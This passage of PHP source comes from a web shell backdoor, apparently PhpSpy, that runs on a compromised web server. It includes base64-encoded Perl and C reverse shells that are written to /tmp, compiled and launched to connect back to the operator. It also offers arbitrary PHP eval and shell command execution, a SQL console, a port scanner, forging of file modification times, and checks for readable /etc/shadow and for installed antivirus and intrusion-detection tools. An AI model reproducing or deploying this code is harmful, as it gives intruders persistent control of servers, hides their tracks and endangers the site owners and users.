            p('&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '.$dbname.':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'.htmlspecialchars($sql_query,ENT_QUOTES).'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" onclick="$(\'doing\').value=\'\'" style="height:50px;" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;');

            if ($sql_query) {

                $querys = @explode(';',$sql_query);

                foreach($querys as $num=&gt;$query) {

                    if ($query) {

                        p("&lt;p class=\"red b\"&gt;Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/p&gt;");

                        switch($DB-&gt;query_res($query))

                        {

                            case 0:

                                p('&lt;h2&gt;'.$DB-&gt;halt('Error').'&lt;/h2&gt;');

                                break;  

                            case 1:

                                $result = $DB-&gt;query($query);

                                $tatol = $DB-&gt;num_rows($result);

                                p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');

                                p('&lt;tr class="head"&gt;');

                                $fieldnum = @mysql_num_fields($result);

                                for($i=0;$i&lt;$fieldnum;$i++){

                                    p('&lt;td nowrap&gt;'.@mysql_field_name($result, $i).'&lt;/td&gt;');

                                }

                                p('&lt;/tr&gt;');

                                

                                if (!$tatol) {

                                    p('&lt;tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"&gt;&lt;td nowrap colspan="'.$fieldnum.'" class="red b"&gt;No records&lt;/td&gt;&lt;/tr&gt;');

                                } else {

                                    while($mn = $DB-&gt;fetch($result)){

                                        $thisbg = bg();

                                        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');

                                        //读取记录用

                                        foreach($mn as $key=&gt;$inside){

                                            p('&lt;td nowrap&gt;'.(($inside == null) ? '&lt;i&gt;null&lt;/i&gt;' : html_clean($inside)).'&lt;/td&gt;');

                                        }

                                        p('&lt;/tr&gt;');

                                        unset($b1);

                                    }

                                }

                                p('&lt;/table&gt;');

                                break;

                            case 2:

                                p('&lt;h2&gt;Affected Rows : '.$DB-&gt;affected_rows().'&lt;/h2&gt;');

                                break;

                        }

                    }

                }

            } else {

                $query = $DB-&gt;query("SHOW TABLE STATUS");

                $table_num = $table_rows = $data_size = 0;

                $tabledb = array();

                while($table = $DB-&gt;fetch($query)) {

                    $data_size = $data_size + $table['Data_length'];

                    $table_rows = $table_rows + $table['Rows'];

                    $table_num++;

                    $tabledb[] = $table;

                }

                $data_size = sizecount($data_size);

                unset($table);

                if (count($tabledb)) {

                    if ($highver) {

                        $db_engine = $DB-&gt;fetch($DB-&gt;query("SHOW VARIABLES LIKE 'storage_engine';"));                     

                        $db_collation = $DB-&gt;fetch($DB-&gt;query("SHOW VARIABLES LIKE 'collation_database';"));

                    }

                    $sort = array('Name', 1);

                    if($order) {

                        if(preg_match('!s_([A-z_]+)_(\d{1})!', $order, $match)) {

                            $sort = array($match[1], (int)$match[2]);

                        }

                    }

                    usort($tabledb, 'cmp');

                    p('&lt;table border="0" cellpadding="0" cellspacing="0" id="lists"&gt;');

                    p('&lt;tr class="head"&gt;');

                    p('&lt;td width="2%"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /&gt;&lt;/td&gt;');

                    p('&lt;td&gt;&lt;a href="javascript:setsort(\'s_Name_'.($sort[1]?0:1).'\');"&gt;Name&lt;/a&gt; '.($order == 's_Name_0' ? $dchar : '').($order == 's_Name_1' || !$order ? $uchar : '').'&lt;/td&gt;');

                    p('&lt;td&gt;&lt;a href="javascript:setsort(\'s_Rows_'.($sort[1]?0:1).'\');"&gt;Rows&lt;/a&gt;'.($order == 's_Rows_0' ? $dchar : '').($order == 's_Rows_1' ? $uchar : '').'&lt;/td&gt;');

                    p('&lt;td&gt;&lt;a href="javascript:setsort(\'s_Data_length_'.($sort[1]?0:1).'\');"&gt;Data_length&lt;/a&gt;'.($order == 's_Data_length_0' ? $dchar : '').($order == 's_Data_length_1' ? $uchar : '').'&lt;/td&gt;');

                    p('&lt;td&gt;&lt;a href="javascript:setsort(\'s_Create_time_'.($sort[1]?0:1).'\');"&gt;Create_time&lt;/a&gt;'.($order == 's_Create_time_0' ? $dchar : '').($order == 's_Create_time_1' ? $uchar : '').'&lt;/td&gt;');

                    p('&lt;td&gt;&lt;a href="javascript:setsort(\'s_Update_time_'.($sort[1]?0:1).'\');"&gt;Update_time&lt;/a&gt;'.($order == 's_Update_time_0' ? $dchar : '').($order == 's_Update_time_1' ? $uchar : '').'&lt;/td&gt;');

                    if ($highver) {

                        p('&lt;td&gt;Engine&lt;/td&gt;');

                        p('&lt;td&gt;Collation&lt;/td&gt;');

                    }

                    p('&lt;td&gt;Other&lt;/td&gt;');

                    p('&lt;/tr&gt;');

                    foreach ($tabledb as $key =&gt; $table) {

                        $thisbg = bg();

                        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');

                        p('&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name="bak_table[]" value="'.$table['Name'].'" /&gt;&lt;/td&gt;');

                        p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\');"&gt;'.$table['Name'].'&lt;/a&gt;&lt;/td&gt;');

                        p('&lt;td&gt;'.$table['Rows'].' &lt;/td&gt;');

                        p('&lt;td&gt;'.sizecount($table['Data_length']).'&lt;/td&gt;');

                        p('&lt;td&gt;'.$table['Create_time'].' &lt;/td&gt;');

                        p('&lt;td&gt;'.$table['Update_time'].' &lt;/td&gt;');

                        if ($highver) {

                            p('&lt;td&gt;'.$table['Engine'].'&lt;/td&gt;');

                            p('&lt;td&gt;'.$table['Collation'].'&lt;/td&gt;');

                        }

                        p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\', \'structure\');"&gt;Structure&lt;/a&gt;&lt;/td&gt;');

                        p('&lt;/tr&gt;');

                    }

                    p('&lt;tr class="head"&gt;');

                    p('&lt;td width="2%"&gt; &lt;/td&gt;');

                    p('&lt;td&gt;'.$table_num.' table(s)&lt;/td&gt;');

                    p('&lt;td&gt;'.$table_rows.'&lt;/td&gt;');

                    p('&lt;td&gt;'.$data_size.'&lt;/td&gt;');

                    p('&lt;td&gt; &lt;/td&gt;');

                    p('&lt;td&gt; &lt;/td&gt;');

                    if ($highver) {

                        p('&lt;td&gt;'.$db_engine['Value'].'&lt;/td&gt;');

                        p('&lt;td&gt;'.$db_collation['Value'].'&lt;/td&gt;');

                    }

                    p('&lt;td&gt; &lt;/td&gt;');

                    p('&lt;/tr&gt;');

                    p("&lt;tr class=\"".bg()."\"&gt;&lt;td colspan=\"".($highver ? 9 : 7)."\"&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';$('dbform').submit();\" /&gt;&lt;/td&gt;&lt;/tr&gt;");

                    p("&lt;/table&gt;");

                } else {

                    p('&lt;p class="red b"&gt;No tables&lt;/p&gt;');

                }

                $DB-&gt;free_result($query);

            }

        }

        $DB-&gt;close();

    }

    formfoot();

}//end mysql



elseif ($act == 'backconnect') {



    !$p2 &amp;&amp; $p2 = $_SERVER['REMOTE_ADDR'];

    !$p3 &amp;&amp; $p3 = '12345';

    $usedb = array('perl'=&gt;'perl','c'=&gt;'c');



    $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".

        "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".

        "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".

        "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".

        "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".

        "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".

        "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".

        "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".

        "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".

        "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".

        "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".

        "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".

        "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".

        "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";



    if ($p1 == 'start' &amp;&amp; $p2 &amp;&amp; $p3 &amp;&amp; $p4){

        if ($p4 == 'perl') {

            cf('/tmp/angel_bc',$back_connect);

            $res = execute(which('perl')." /tmp/angel_bc ".$p2." ".$p3." &amp;");

        } else {

            cf('/tmp/angel_bc.c',$back_connect_c);

            $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');

            @unlink('/tmp/angel_bc.c');

            $res = execute("/tmp/angel_bc ".$p2." ".$p3." &amp;");

        }

        m('Now script try connect to '.$p2.':'.$p3.' ...');

    }



    formhead(array('title'=&gt;'Back Connect', 'onsubmit'=&gt;'g(\'backconnect\',null,\'start\',this.p2.value,this.p3.value,this.p4.value);return false;'));

    p('&lt;p&gt;');

    p('Your IP:');

    makeinput(array('name'=&gt;'p2','size'=&gt;20,'value'=&gt;$p2));

    p('Your Port:');

    makeinput(array('name'=&gt;'p3','size'=&gt;15,'value'=&gt;$p3));

    p('Use:');

    makeselect(array('name'=&gt;'p4','option'=&gt;$usedb,'selected'=&gt;$p4));

    makeinput(array('value'=&gt;'Start','type'=&gt;'submit','class'=&gt;'bt'));

    p('&lt;/p&gt;');

    formfoot();

}//end



elseif ($act == 'portscan') {

    !$p2 &amp;&amp; $p2 = '127.0.0.1';

    !$p3 &amp;&amp; $p3 = '21,80,135,139,445,1433,3306,3389,5631,43958';

    formhead(array('title'=&gt;'端口扫描', 'onsubmit'=&gt;'g(\'portscan\',null,\'start\',this.p2.value,this.p3.value);return false;'));

    p('&lt;p&gt;');

    p('IP:');

    makeinput(array('name'=&gt;'p2','size'=&gt;20,'value'=&gt;$p2));

    p('Port:');

    makeinput(array('name'=&gt;'p3','size'=&gt;80,'value'=&gt;$p3));

    makeinput(array('value'=&gt;'扫描','type'=&gt;'submit','class'=&gt;'bt'));

    p('&lt;/p&gt;');

    formfoot();



    if ($p1 == 'start') {

        p('&lt;h2&gt;Result »&lt;/h2&gt;');

        p('&lt;ul class="info"&gt;');

        foreach(explode(',', $p3) as $port) {

            $fp = @fsockopen($p2, $port, $errno, $errstr, 1); 

            if (!$fp) {

                p('&lt;li&gt;'.$p2.':'.$port.' ------------------------ &lt;span class="b"&gt;Close&lt;/span&gt;&lt;/li&gt;');

           } else {

                p('&lt;li&gt;'.$p2.':'.$port.' ------------------------ &lt;span class="red b"&gt;Open&lt;/span&gt;&lt;/li&gt;');

                @fclose($fp);

           } 

        }

        p('&lt;/ul&gt;');

    }

}



elseif ($act == 'eval') {

    $phpcode = trim($p1);

    if($phpcode){

        if (!preg_match('#&lt;\?#si', $phpcode)) {

            $phpcode = "&lt;?php\n\n{$phpcode}\n\n?&gt;";

        }

        eval("?"."&gt;$phpcode&lt;?");

    }

    formhead(array('title'=&gt;'Eval PHP代码', 'onsubmit'=&gt;'g(\'eval\',null,this.p1.value);return false;'));

    maketext(array('title'=&gt;'PHP 代码','name'=&gt;'p1', 'value'=&gt;$phpcode));

    p('&lt;p&gt;&lt;a href="http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/" target="_blank"&gt;获得插件&lt;/a&gt;&lt;/p&gt;');

    formfooter();

}//end eval



elseif ($act == 'editfile') {



    // 编辑文件

    if ($p1 == 'edit' &amp;&amp; $p2 &amp;&amp; $p3) {

        $fp = @fopen($p2,'w');

        m('Save file '.(@fwrite($fp,$p3) ? 'success' : 'failed'));

        @fclose($fp);

    }

    $contents = '';

    if(file_exists($p2)) {

        $fp=@fopen($p2,'r');

        $contents=@fread($fp, filesize($p2));

        @fclose($fp);

        $contents=htmlspecialchars($contents);

    }

    formhead(array('title'=&gt;'创建/编辑文件', 'onsubmit'=&gt;'g(\'editfile\',null,\'edit\',this.p2.value,this.p3.value);return false;'));

    makeinput(array('title'=&gt;'文件名:','name'=&gt;'p2','value'=&gt;$p2,'newline'=&gt;1));

    maketext(array('title'=&gt;'文件内容:','name'=&gt;'p3','value'=&gt;$contents));

    formfooter();

    goback();



}//end editfile



elseif ($act == 'newtime') {

    $filemtime = @filemtime($p1);



    formhead(array('title'=&gt;'Clone folder/file was last modified time', 'onsubmit'=&gt;'g(\'file\',null,\'clonetime\',this.p2.value,this.p3.value);return false;'));

    makeinput(array('title'=&gt;'Alter folder/file','name'=&gt;'p2','value'=&gt;$p1,'size'=&gt;120,'newline'=&gt;1));

    makeinput(array('title'=&gt;'Reference folder/file','name'=&gt;'p3','value'=&gt;$cwd,'size'=&gt;120,'newline'=&gt;1));

    formfooter();



    formhead(array('title'=&gt;'Set last modified', 'onsubmit'=&gt;'g(\'file\',null,\'settime\',this.p2.value,this.p3.value);return false;'));

    makeinput(array('title'=&gt;'Current folder/file','name'=&gt;'p2','value'=&gt;$p1,'size'=&gt;120,'newline'=&gt;1));

    makeinput(array('title'=&gt;'Modify time','name'=&gt;'p3','value'=&gt;date("Y-m-d H:i:s", $filemtime),'size'=&gt;120,'newline'=&gt;1));

    formfooter();



    goback();

}//end newtime



elseif ($act == 'shell') {

    formhead(array('title'=&gt;'执行命令', 'onsubmit'=&gt;'g(\'shell\',null,this.p1.value);return false;'));

    p('&lt;p&gt;');

    makeinput(array('name'=&gt;'p1','value'=&gt;htmlspecialchars($p1)));

    makeinput(array('class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'执行'));

    p('&lt;/p&gt;');

    formfoot();



    if ($p1) {

        p('&lt;pre&gt;'.execute($p1).'&lt;/pre&gt;');

    }

}//end shell



elseif ($act == 'phpenv') {

    $d=array();

    if(function_exists('mysql_get_client_info'))

        $d[] = "MySql (".mysql_get_client_info().")";

    if(function_exists('mssql_connect'))

        $d[] = "MSSQL";

    if(function_exists('pg_connect'))

        $d[] = "PostgreSQL";

    if(function_exists('oci_connect'))

        $d[] = "Oracle";

    $info = array(

        1 =&gt; array('服务器 时间',date('Y/m/d h:i:s',$timestamp)),

        2 =&gt; array('服务器 域名',$_SERVER['SERVER_NAME']),

        3 =&gt; array('服务器 IP',gethostbyname($_SERVER['SERVER_NAME'])),

        4 =&gt; array('服务器 系统',PHP_OS),

        5 =&gt; array('服务器 系统编码',$_SERVER['HTTP_ACCEPT_LANGUAGE']),

        6 =&gt; array('服务器 软件',$_SERVER['SERVER_SOFTWARE']),

        7 =&gt; array('服务器 网站端口',$_SERVER['SERVER_PORT']),

        8 =&gt; array('PHP 运行方式',strtoupper(php_sapi_name())),

        9 =&gt; array('文件路径',__FILE__),



        10 =&gt; array('PHP 版本',PHP_VERSION),

        11 =&gt; array('PHP信息',(IS_PHPINFO ? '&lt;a href="javascript:g(\'phpinfo\');"&gt;Yes&lt;/a&gt;' : 'No')),

        12 =&gt; array('安全模式',getcfg('safe_mode')),

        13 =&gt; array('管理员',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from'))),

        14 =&gt; array('允许url打开',getcfg('allow_url_fopen')),

        15 =&gt; array('使用dl',getcfg('enable_dl')),

        16 =&gt; array('显示错误',getcfg('display_errors')),

        17 =&gt; array('注册全局变量',getcfg('register_globals')),

        18 =&gt; array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),

        19 =&gt; array('内存限制',getcfg('memory_limit')),

        20 =&gt; array('post大小',getcfg('post_max_size')),

        21 =&gt; array('上传文件大小',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed')),

        22 =&gt; array('执行时间',getcfg('max_execution_time').' second(s)'),

        23 =&gt; array('禁用功能',($dis_func ? $dis_func : 'No')),

        24 =&gt; array('所支持的数据库',implode(', ', $d)),

        25 =&gt; array('Curl支持',function_exists('curl_version') ? 'Yes' : 'No'),

        26 =&gt; array('Open base dir',getcfg('open_basedir')),

        27 =&gt; array('Safe mode exec dir',getcfg('safe_mode_exec_dir')),

        28 =&gt; array('Safe mode include dir',getcfg('safe_mode_include_dir')),

    );



    $hp = array(0=&gt; 'Server', 1=&gt; 'PHP');

    for($a=0;$a&lt;2;$a++) {

        p('&lt;h2&gt;'.$hp[$a].' »&lt;/h2&gt;');

        p('&lt;ul class="info"&gt;');

        if ($a==0) {

            for($i=1;$i&lt;=9;$i++) {

                p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');

            }

        } elseif ($a == 1) {

            for($i=10;$i&lt;=25;$i++) {

                p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');

            }

        }

        p('&lt;/ul&gt;');

    }

}//end phpenv



elseif ($act == 'secinfo') {

    

    if( !IS_WIN ) {

        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');

        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');

        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');

        secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');

        secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');

        secparam('OS version', @file_get_contents('/proc/version'));

        secparam('Distr name', @file_get_contents('/etc/issue.net'));

        $safe_mode = @ini_get('safe_mode');

        if(!$GLOBALS['safe_mode']) {

            $temp=array();

            foreach ($userful as $item)

                if(which($item)){$temp[]=$item;}

            secparam('Userful', implode(', ',$temp));

            $temp=array();

            foreach ($danger as $item)

                if(which($item)){$temp[]=$item;}

            secparam('Danger', implode(', ',$temp));

            $temp=array();

            foreach ($downloaders as $item) 

                if(which($item)){$temp[]=$item;}

            secparam('Downloaders', implode(', ',$temp));

            secparam('Hosts', @file_get_contents('/etc/hosts'));

            secparam('HDD space', execute('df -h'));

            secparam('Mount options', @file_get_contents('/etc/fstab'));

        }

    } else {

        secparam('OS Version',execute('ver'));

        secparam('Account Settings',execute('net accounts'));

        secparam('User Accounts',execute('net user'));

        secparam('IP Configurate',execute('ipconfig -all'));

    }

}//end



else {

    m('未定义的行动');

}



?&gt;

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;

    &lt;span style="float:right;"&gt;

    &lt;?php

    debuginfo();

    ob_end_flush();

    if (isset($DB)) {

        echo '. '.$DB-&gt;querycount.' queries';

    }

    ?&gt;

    &lt;/span&gt;

.

&lt;/div&gt;

&lt;/body&gt;

&lt;/html&gt;



&lt;?php



/*======================================================

函数库

======================================================*/



function secparam($n, $v) {

    $v = trim($v);

    if($v) {

        p('&lt;h2&gt;'.$n.' »&lt;/h2&gt;');

        p('&lt;div class="infolist"&gt;');

        if(strpos($v, "\n") === false)

            p($v.'&lt;br /&gt;');

        else

            p('&lt;pre&gt;'.$v.'&lt;/pre&gt;');

        p('&lt;/div&gt;');

    }

}

function m($msg) {

    echo '&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;';

    echo $msg;

    echo '&lt;/div&gt;';

}

function s_array($array) {

    return is_array($array) ? array_map('s_array', $array) : stripslashes($array);

}

function scookie($key, $value, $life = 0, $prefix = 1) {

    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;

    $key = ($prefix ? $cookiepre : '').$key;

    $life = $life ? $life : $cookielife;

    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;

    setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);

}

function loginpage() {

    formhead();

    makehide('act','login');

    makeinput(array('name'=&gt;'password','type'=&gt;'password','size'=&gt;'20'));

    makeinput(array('type'=&gt;'submit','value'=&gt;'登录'));

    formfoot();

    exit;

}

function execute($cfe) {

    $res = '';

    if ($cfe) {

        if(function_exists('system')) {

            @ob_start();

            @system($cfe);

            $res = @ob_get_contents();

            @ob_end_clean();

        } elseif(function_exists('passthru')) {

            @ob_start();

            @passthru($cfe);

            $res = @ob_get_contents();

            @ob_end_clean();

        } elseif(function_exists('shell_exec')) {

            $res = @shell_exec($cfe);

        } elseif(function_exists('exec')) {

            @exec($cfe,$res);

            $res = join("\n",$res);

        } elseif(@is_resource($f = @popen($cfe,"r"))) {

            $res = '';

            while(!@feof($f)) {

                $res .= @fread($f,1024); 

            }

            @pclose($f);

        }

    }

    return $res;

}

function which($pr) {

    $path = execute("which $pr");

    return ($path ? $path : $pr); 

}

function cf($fname,$text){

    if($fp=@fopen($fname,'w')) {

        @fputs($fp,@base64_decode($text));

        @fclose($fp);

    }

}

function dirsize($cwd) { 

    $dh = @opendir($cwd);

    $size = 0;

    while($file = @readdir($dh)) {

        if ($file != '.' &amp;&amp; $file != '..') {

            $path = $cwd.'/'.$file;

            $size += @is_dir($path) ? dirsize($path) : sprintf("%u", @filesize($path));

        }

    }

    @closedir($dh);

    return $size;

}

// 页面调试信息

function debuginfo() {

    global $starttime;

    $mtime = explode(' ', microtime());

    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);

    echo 'Processed in '.$totaltime.' second(s)';

}



// 清除HTML代码

function html_clean($content) {

    $content = htmlspecialchars($content);

    $content = str_replace("\n", "&lt;br /&gt;", $content);

    $content = str_replace("  ", "  ", $content);

    $content = str_replace("\t", "    ", $content);

    return $content;

}



// 获取权限

function getChmod($file){

    return substr(base_convert(@fileperms($file),10,8),-4);

}



function PermsColor($f) { 

    if (!is_readable($f)) {

        return '&lt;span class="red"&gt;'.getPerms($f).'&lt;/span&gt;';

    } elseif (!is_writable($f)) {

        return '&lt;span class="black"&gt;'.getPerms($f).'&lt;/span&gt;';

    } else {

        return '&lt;span class="green"&gt;'.getPerms($f).'&lt;/span&gt;';

    }

}

function getPerms($file) {

    $mode = @fileperms($file);

    if (($mode &amp; 0xC000) === 0xC000) {$type = 's';}

    elseif (($mode &amp; 0x4000) === 0x4000) {$type = 'd';}

    elseif (($mode &amp; 0xA000) === 0xA000) {$type = 'l';}

    elseif (($mode &amp; 0x8000) === 0x8000) {$type = '-';} 

    elseif (($mode &amp; 0x6000) === 0x6000) {$type = 'b';}

    elseif (($mode &amp; 0x2000) === 0x2000) {$type = 'c';}

    elseif (($mode &amp; 0x1000) === 0x1000) {$type = 'p';}

    else {$type = '?';}



    $owner['read'] = ($mode &amp; 00400) ? 'r' : '-'; 

    $owner['write'] = ($mode &amp; 00200) ? 'w' : '-'; 

    $owner['execute'] = ($mode &amp; 00100) ? 'x' : '-'; 

    $group['read'] = ($mode &amp; 00040) ? 'r' : '-'; 

    $group['write'] = ($mode &amp; 00020) ? 'w' : '-'; 

    $group['execute'] = ($mode &amp; 00010) ? 'x' : '-'; 

    $world['read'] = ($mode &amp; 00004) ? 'r' : '-'; 

    $world['write'] = ($mode &amp; 00002) ? 'w' : '-'; 

    $world['execute'] = ($mode &amp; 00001) ? 'x' : '-'; 



    if( $mode &amp; 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}

    if( $mode &amp; 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}

    if( $mode &amp; 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}

 

    return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];

}



function getUser($file) {

    if (function_exists('posix_getpwuid')) {

        $array = @posix_getpwuid(@fileowner($file));

        if ($array &amp;&amp; is_array($array)) {

            return ' / &lt;a href="#" title="User: '.$array['name'].'&amp;#13&amp;#10Passwd: '.$array['passwd'].'&amp;#13&amp;#10Uid: '.$array['uid'].'&amp;#13&amp;#10gid: '.$array['gid'].'&amp;#13&amp;#10Gecos: '.$array['gecos'].'&amp;#13&amp;#10Dir: '.$array['dir'].'&amp;#13&amp;#10Shell: '.$array['shell'].'"&gt;'.$array['name'].'&lt;/a&gt;';

        }

    }

    return '';

}



function copy_paste($c,$f,$d){

    if(is_dir($c.$f)){

        mkdir($d.$f);

        $dirs = scandir($c.$f);

        if ($dirs) {

            $dirs = array_diff($dirs, array('..', '.'));

            foreach ($dirs as $file) {

                copy_paste($c.$f.'/',$file, $d.$f.'/');

            }

        }

    } elseif(is_file($c.$f)) {

        copy($c.$f, $d.$f);

    }

}

// 删除目录

function deltree($deldir) {

    $dirs = @scandir($deldir);

    if ($dirs) {

        $dirs = array_diff($dirs, array('..', '.'));

        foreach ($dirs as $file) {  

            if((is_dir($deldir.'/'.$file))) {

                @chmod($deldir.'/'.$file,0777);

                deltree($deldir.'/'.$file); 

            } else {

                @chmod($deldir.'/'.$file,0777);

                @unlink($deldir.'/'.$file);

            }

        }

        @chmod($deldir,0777);

        return @rmdir($deldir) ? 1 : 0;

    } else {

        return 0;

    }

}



// 表格行间的背景色替换

function bg() {

    global $bgc;

    return ($bgc++%2==0) ? 'alt1' : 'alt2';

}



function cmp($a, $b) {

    global $sort;

    if(is_numeric($a[$sort[0]])) {

        return (($a[$sort[0]] &lt; $b[$sort[0]]) ? -1 : 1)*($sort[1]?1:-1);

    } else {

        return strcmp($a[$sort[0]], $b[$sort[0]])*($sort[1]?1:-1);

    }

}



// 获取当前目录的上级目录

function getUpPath($cwd) {

    $pathdb = explode('/', $cwd);

    $num = count($pathdb);

    if ($num &gt; 2) {

        unset($pathdb[$num-1],$pathdb[$num-2]);

    }

    $uppath = implode('/', $pathdb).'/';

    $uppath = str_replace('//', '/', $uppath);

    return $uppath;

}



// 检查PHP配置参数

function getcfg($varname) {

    $result = get_cfg_var($varname);

    if ($result == 0) {

        return 'No';

    } elseif ($result == 1) {

        return 'Yes';

    } else {

        return $result;

    }

}



// 获得文件扩展名

function getext($file) {

    $info = pathinfo($file);

    return $info['extension'];

}

function GetWDirList($path){

    global $dirdata,$j,$web_cwd;

    !$j &amp;&amp; $j=1;

    $dirs = @scandir($path);

    if ($dirs) {

        $dirs = array_diff($dirs, array('..','.'));

        foreach ($dirs as $file) {

            $f=str_replace('//','/',$path.'/'.$file);

            if(is_dir($f)){

                if (is_writable($f)) {

                    $dirdata[$j]['filename']='/'.str_replace($web_cwd,'',$f);

                    $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));

                    $dirdata[$j]['chmod']=getChmod($f);

                    $dirdata[$j]['perm']=PermsColor($f);

                    $dirdata[$j]['owner']=getUser($f);

                    $dirdata[$j]['link']=$f;

                    $j++;

                }

                GetWDirList($f);

            }

        }

        return $dirdata;

    } else {

        return array();

    }

}

function sizecount($size) {

    $unit = array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');

